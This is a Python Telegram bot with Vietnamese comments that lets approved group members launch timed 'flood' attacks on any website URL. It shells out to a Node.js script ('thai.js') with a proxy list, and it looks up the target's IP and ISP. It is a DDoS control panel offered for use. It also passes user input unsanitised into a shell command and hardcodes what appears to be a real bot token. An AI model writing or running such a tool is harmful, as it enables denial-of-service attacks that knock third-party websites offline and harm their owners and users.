import subprocess
import asyncio
import requests
import json
import socket
from urllib import parse

# ID của nhóm cho phép
ALLOWED_CHAT_ID = -1002200433985  # Thay thế bằng ID nhóm của bạn

# ID của người dùng được phép tấn công không giới hạn
ALLOWED_USER_ID = 5942559129  # Thay thế bằng ID người dùng của bạn

# Cờ để kiểm tra xem có ai đang tấn công hay không
is_attacking = False
ongoing_info = {}  # Lưu thông tin ongoing

def escape_html(text):
    escape_characters = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#39;',
        '{': '&#123;',  
        '}': '&#125;',  
    }
    for char, escape in escape_characters.items():
        text = text.replace(char, escape)
    return text

def get_ip_from_url(url):
    try:
        split_url = parse.urlsplit(url)
        ip = socket.gethostbyname(split_url.netloc)
        return ip
    except socket.error as e:
        return None

def get_isp_info(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException:
        return None

# Hàm xử lý lệnh /attack
async def attack(update, context):
    global is_attacking

    # Kiểm tra nếu bot được gọi từ nhóm cho phép
    if update.effective_chat.id != ALLOWED_CHAT_ID:
        return

    if is_attacking:
        return

    try:
        # Lấy thông tin từ tin nhắn: URL và thời gian
        url = context.args[0]
        time = int(context.args[1]) if len(context.args) > 1 else 60  # Mặc định là 60 giây nếu không có thời gian

        # Kiểm tra thời gian tấn công
        if time > 60 and update.effective_user.id != ALLOWED_USER_ID:
            return

        # Lấy IP từ URL
        ip = get_ip_from_url(url)
        if not ip:
            return
        
        # Lấy thông tin ISP của host
        isp_info = get_isp_info(ip)

        # Đặt cờ tấn công đang diễn ra
        is_attacking = True
        ongoing_info[update.effective_user.id] = {"url": url, "time_left": time}  # Lưu thông tin ongoing
        
        # Chạy lệnh Node.js (thai.js) trên máy host
        command = f"node thai.js {url} {time} 64 64 proxy.txt flood"
        process = subprocess.Popen(command, shell=True)

        for remaining in range(time, 0, -1):
            ongoing_info[update.effective_user.id]["time_left"] = remaining
            await asyncio.sleep(1)  # Chờ 1 giây

        # Kiểm tra xem tiến trình còn đang chạy hay không
        process.terminate()  # Dừng tiến trình nếu nó còn chạy
    
    except IndexError:
        pass

    except ValueError:
        pass

    except Exception as e:
        pass

    finally:
        # Đặt lại cờ tấn công sau khi hoàn thành
        is_attacking = False
        ongoing_info.pop(update.effective_user.id, None)  # Xóa thông tin ongoing

# Hàm xử lý lệnh /ongoing
async def ongoing(update, context):
    if update.effective_chat.id != ALLOWED_CHAT_ID:
        return

    if update.effective_user.id in ongoing_info:
        info = ongoing_info[update.effective_user.id]
        url = info["url"]
        time_left = info["time_left"]
    else:
        pass

# Hàm xử lý lệnh /help
async def help_command(update, context):
    if update.effective_chat.id != ALLOWED_CHAT_ID:
        return

    help_info = {
        "/attack": "[url] [time] - Tấn công một website.",
        "/ongoing": "- Kiểm tra thông tin tấn công đang diễn ra.",
        "/help": "- Hiển thị thông tin trợ giúp."
    }

# Hàm main để khởi chạy bot
def main():
    application = ApplicationBuilder().token('8017205270:AAH4Knt0roVXosMvSe3CJ4MWkAq_ocoLXR8').build()  # Thay thế YOUR_BOT_TOKEN bằng token của bạn

    # Đăng ký lệnh /attack, /ongoing và /help
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("ongoing", ongoing))
    application.add_handler(CommandHandler("help", help_command))

    # Khởi động bot và bắt đầu lắng nghe tin nhắn
    application.run_polling()

# Chạy chương trình
if __name__ == '__main__':
    main()
